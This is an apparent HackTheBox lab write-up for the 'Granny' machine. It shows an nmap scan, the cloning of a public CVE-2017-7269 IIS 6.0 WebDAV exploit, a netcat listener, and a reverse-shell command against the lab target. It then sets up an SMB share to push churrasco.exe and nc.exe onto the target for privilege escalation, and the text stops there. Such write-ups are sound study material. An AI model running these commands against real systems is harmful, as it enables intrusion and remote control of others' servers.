# Granny

**Platform:** HackTheBox  
**OS:** Windows Server 2003  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Windows Server 2003 machine running IIS 6.0 with WebDAV enabled,
vulnerable to CVE-2017-7269, a remote buffer overflow. Identical
attack path to Grandpa. Initial access via public exploit, privilege
escalation via SeImpersonatePrivilege with churrasco.exe.

---

## 1. Reconnaissance

Port scan using nmap:

```bash
nmap -Pn -sCV -p- --top-ports 1000 -T3 10.10.10.15 -oG allPorts
nmap -sCV -p80 10.10.10.15 -oN targeted
```

**Open ports:**

| Port | Service |
|------|---------|
| 80 | HTTP IIS 6.0 |

Burp Suite confirmed IIS 6.0 with WebDAV active in response headers.

---

## 2. Vulnerability Identification

```bash
searchsploit IIS 6.0
```

Identified CVE-2017-7269 — remote buffer overflow via WebDAV.

---

## 3. Exploitation

Cloned exploit:

```bash
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
cd iis6-exploit-2017-CVE-2017-7269
mv "iis6 reverse shell" iis6.py
```

Started listener:

```bash
nc -lvnp 4444
```

Executed exploit:

```bash
python2 iis6.py 10.10.10.15 80 10.10.15.207 4444
```

Received shell as **NT AUTHORITY\NETWORK SERVICE**.

---

## 4. Privilege Escalation

Checked privileges:

```bash
whoami /priv
```

SeImpersonatePrivilege was enabled.

Served tools from attacker machine:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Downloaded tools on target:
copy \10.10.15.207\smbFolder\churrasco.exe C:\Windows\Temp
copy \10.10.15.207\smbFolder\nc.exe C:\Windows\Temp\
